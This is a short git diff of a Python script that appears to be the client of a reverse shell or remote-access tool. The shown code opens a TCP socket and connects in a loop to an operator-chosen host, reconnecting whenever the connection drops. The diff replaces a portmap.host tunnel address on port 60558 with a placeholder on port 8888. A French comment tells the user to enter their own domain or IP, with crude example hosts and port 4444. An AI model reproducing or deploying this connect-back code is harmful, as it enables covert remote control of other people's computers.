@@ -6,7 +6,7 @@ def connect():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
         try:
-            client.connect(("D4imKouach1-60558.portmap.host", 60558)) # Ici tu met ton domaine/ip genre client.connect(("GayFurryPorn.net", 52789)) ou client.connect(("201.23.57.88", 4444))
+            client.connect(("", 8888)) # Ici tu met ton domaine/ip genre client.connect(("GayFurryPorn.net", 52789)) ou client.connect(("201.23.57.88", 4444))
             print("[+] Connecté au serveur.")
             return client
         except:
@@ -65,3 +65,4 @@ while True:
         Client.close()
         time.sleep(1)
         print("[*] Tentative de reconnexion...")
+
